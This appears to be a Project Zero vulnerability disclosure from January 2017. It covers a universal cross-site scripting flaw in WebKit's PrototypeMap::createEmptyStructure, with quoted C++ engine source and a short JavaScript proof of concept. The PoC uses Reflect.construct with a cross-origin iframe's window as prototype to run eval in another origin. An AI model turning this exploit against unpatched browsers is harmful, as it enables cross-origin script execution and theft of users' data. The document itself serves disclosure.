# UXSS via PrototypeMap::createEmptyStructure

> Reported by lokihardt@google.com, Jan 17 2017

When creating an object in Javascript, its `Structure` is created with the constructor's prototype's `VM`.

Here's some snippets of that routine.

```cpp
Structure* InternalFunction::createSubclassStructure(ExecState* exec, JSValue newTarget, Structure* baseClass)
{
    ...
    if (newTarget && newTarget != exec->jsCallee()) {
        // newTarget may be an InternalFunction if we were called from Reflect.construct.
        JSFunction* targetFunction = jsDynamicCast<JSFunction*>(newTarget);

        if (LIKELY(targetFunction)) {
            ...
                return targetFunction->rareData(vm)->createInternalFunctionAllocationStructureFromBase(vm, prototype, baseClass);
            ...
        } else {
            ...
                return vm.prototypeMap.emptyStructureForPrototypeFromBaseStructure(prototype, baseClass);
            ...
        }
    }

    return baseClass;
}

inline Structure* PrototypeMap::createEmptyStructure(JSObject* prototype, const TypeInfo& typeInfo, const ClassInfo* classInfo, IndexingType indexingType, unsigned inlineCapacity)
{
    ...
    Structure* structure = Structure::create(
        prototype->globalObject()->vm(), prototype->globalObject(), prototype, typeInfo, classInfo, indexingType, inlineCapacity);
    m_structures.set(key, Weak<Structure>(structure));
    ...
}
```

As we can see `Structure::create` is called with prototype's `vm` and `globalObject` as arguments. So it could lead to an UXSS condition.

Tested on Safari 10.0.2(12602.3.12.0.1) and Webkit Nightly 10.0.2(12602.3.12.0.1, r210800).

Poc:

```js
let f = document.body.appendChild(document.createElement('iframe'))
f.onload = () => {
	f.onload = null

	let g = function() {}
	g.prototype = f.contentWindow

	let a = Reflect.construct(Function, ['return window[0].eval;'], g)
	let e = a()
	e('alert(location)')
}

f.src = 'https://abc.xyz/'
```

Link: https://bugs.chromium.org/p/project-zero/issues/detail?id=1084
